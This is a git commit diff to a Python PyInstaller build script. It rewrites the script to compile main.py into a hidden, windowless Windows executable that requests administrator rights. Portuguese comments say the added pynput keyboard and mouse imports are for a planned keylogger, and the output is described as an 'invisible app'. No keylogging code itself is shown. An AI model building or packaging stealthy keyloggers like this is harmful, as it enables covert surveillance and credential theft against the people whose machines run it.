f2c74d189bc103d6940e49801b73eb8760bd116e
Guilherme Faccin <gfaccin27@gmail.com>
2024-09-21 19:37:50 -0300

    fix: update build script to fix instance cloning bug

--- builder.py
+++ builder.py
@@ -1,52 +1,28 @@
-import os
-import shutil
 import subprocess
-import zipfile
-import requests
+import os
 
-class Build:
+def compile_main():
+    try:
+        subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True)
+    except subprocess.CalledProcessError:
+        print("PyInstaller não está instalado. Instalando...")
+        subprocess.run(["pip", "install", "pyinstaller"], check=True)
 
-    def __init__(self) -> None:
-        self.build_dir = os.path.join(os.getcwd(), 'build')
-        self.dist_dir = os.path.join(os.getcwd(), 'dist')
-        os.makedirs(self.build_dir, exist_ok=True)
-        os.makedirs(self.dist_dir, exist_ok=True)
+    command = ["pyinstaller", "--onefile", "--noconsole", "--name=Build", "main.py"]
 
-    def get_upx(self) -> None:
+    command.extend([
+        "--windowed",  # msm q no console, só que mais uma validação
+        "--uac-admin",  #req admin privlgs
+        "--hidden-import=pynput.keyboard._win32",  # Importação oculta para pynput (Posteriormente Sera usado no keylogger)
+        "--hidden-import=pynput.mouse._win32",     # Importação oculta para pynput (Posteriormente Sera usado no keylogger)
+    ])
 
-        url = 'https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip'
-        zip_path = os.path.join(self.build_dir, 'upx.zip')
-
-        with requests.get(url, stream=True) as r:
-            r.raise_for_status()
-            with open(zip_path, 'wb') as f:
-                shutil.copyfileobj(r.raw, f)
-
-        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-            zip_ref.extractall(self.build_dir)
-
-    def build(self) -> None:
-        pyinstaller_executable = shutil.which('pyinstaller')
-        if pyinstaller_executable is None:
-            raise RuntimeError("Pyinstaller is not installed or not in path")
-        
-        main_file =  os.path.join(os.getcwd(), 'main.py')
-        plugins_dir = os.path.join(os.getcwd(), 'plugins')
-
-        subprocess.run([
-            pyinstaller_executable,
-            '--onefile',
-            '--noconsole',
-            '--clean',
-            '--distpath', self.dist_dir,
-            '--workpath', os.path.join(self.build_dir, 'work'),
-            '--specpath', os.path.join(self.build_dir, 'spec'),
-            '--upx-dir', os.path.join(self.build_dir, 'upx-3.96-win64'),
-            '--add-data', f'{plugins_dir};plugins',
-            main_file
-        ], check=True)
+    try:
+        subprocess.run(command, check=True)
+        print("Build criada.")
+        print("O executável 'AppInvisivel.exe' foi criado na pasta 'dist'.")
+    except subprocess.CalledProcessError as e:
+        print(f"Erro durante a compilação: {e}")
 
 if __name__ == "__main__":
-    builder = Build()
-    builder.get_upx()
-    builder.build()
+    compile_main()
